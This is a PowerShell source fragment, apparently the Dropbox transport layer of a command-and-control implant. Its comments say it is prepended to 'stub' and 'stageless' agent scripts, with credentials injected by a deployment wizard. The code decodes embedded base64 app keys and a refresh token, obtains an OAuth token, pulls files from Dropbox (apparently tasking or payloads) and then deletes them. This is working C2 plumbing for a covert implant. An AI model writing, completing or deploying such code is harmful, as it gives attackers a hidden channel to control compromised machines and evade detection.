# === TRANSPORT: Dropbox (stub layer, PowerShell) ===
# Credentials substituted by wizard at deploy time.
# Prepended to agent/stub.ps1 and agent/stub_stageless.ps1.

$_AppKey = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_APP_KEY_B64'))
$_AppSec = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_APP_SECRET_B64'))
$_RefTok = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_REFRESH_TOKEN_B64'))

function _Tk {
    try {
        $r = Invoke-RestMethod -Method Post -Uri 'https://api.dropboxapi.com/oauth2/token' -ErrorAction Stop `
            -ContentType 'application/x-www-form-urlencoded' `
            -Body "grant_type=refresh_token&refresh_token=$_RefTok&client_id=$_AppKey&client_secret=$_AppSec"
        return $r.access_token
    } catch { _dbg "token error: $_"; return $null }
}

function _Dl($tk, $path) {
    try {
        $h = @{ Authorization = "Bearer $tk"
                'Dropbox-API-Arg' = "{`"path`":`"$path`"}" }
        $resp = Invoke-WebRequest -Method Post -Uri 'https://content.dropboxapi.com/2/files/download' `
            -Headers $h -ContentType '' -UseBasicParsing -ErrorAction Stop
        return [Text.Encoding]::UTF8.GetString($resp.Content)
    } catch { _dbg "download '$path' error: $_"; return $null }
}

function _Rm($tk, $path) {
    try {
        Invoke-RestMethod -Method Post -Uri 'https://api.dropboxapi.com/2/files/delete_v2' `
            -ErrorAction SilentlyContinue `
            -Headers @{ Authorization = "Bearer $tk" } `
            -ContentType 'application/json' `
            -Body "{`"path`":`"$path`"}" | Out-Null
    } catch {}
}
